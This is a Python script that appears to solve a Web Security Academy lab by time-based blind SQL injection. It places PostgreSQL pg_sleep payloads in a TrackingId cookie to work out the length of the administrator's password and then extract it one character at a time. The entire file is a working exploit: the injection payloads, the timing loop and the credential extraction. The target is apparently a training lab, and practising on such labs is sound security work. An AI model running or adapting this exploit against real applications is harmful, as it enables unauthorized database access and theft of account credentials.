import requests
import string

# Target URL
url = 'https://0a7f006904ed91ec875b4c4f009800ff.web-security-academy.net/filter?category=Pets'

# Characters to test (lowercase + digits)
characters = string.ascii_lowercase + string.digits

# Sleep time used for timing attacks
SLEEP_TIME = 3  # Increased to make sure the sleep is noticeable
session_cookie = 'FONuJAUsNyo9HYyiTjzgsJZCOqaus144'

def get_length():
    print("Detecting password length...")
    for i in range(1, 101):  # Check length from 1 to 100
        cookie = {
            'TrackingId': '',
            'session': session_cookie
        }
        # SQLi payload to measure the length of the password
        payload = f"'||(SELECT CASE WHEN LENGTH((SELECT password FROM users WHERE username='administrator'))={i} THEN pg_sleep({SLEEP_TIME}) ELSE pg_sleep(0) END)--"
        cookie['TrackingId'] = payload
        r = requests.get(url, cookies=cookie)

        # If the response took more than SLEEP_TIME seconds, we found the length
        if r.elapsed.total_seconds() > SLEEP_TIME:
            print(f"Detected password length: {i}")
            return i
    
    # If no length is detected, return None
    return None

def get_data(length):
    print(f"Extracting password of length {length}...")
    temp = ""
    for i in range(1, length + 1):
        for char in characters:
            cookie = {
                'TrackingId': '',
                'session': session_cookie
            }
            # SQLi payload to extract each character of the password
            payload = f"'||(SELECT CASE WHEN substring((SELECT password FROM users WHERE username='administrator') FROM {i} FOR 1)='{char}' THEN pg_sleep({SLEEP_TIME}) ELSE pg_sleep(0) END)--"
            cookie['TrackingId'] = payload
            r = requests.get(url, cookies=cookie)

            # If the response took more than SLEEP_TIME seconds, we found the character
            if r.elapsed.total_seconds() > SLEEP_TIME:
                temp += char
                print(f'\rPassword so far: {temp}', end='', flush=True)
                break
    
    return temp

# Get password length
length = get_length()
if length:
    print(f"\nPassword length: {length}")
    print("Dumping the data, please wait...")
    
    # Get password data
    data = get_data(length)
    print(f"\nExtracted password: {data}")
else:
    print("Failed to detect password length.")
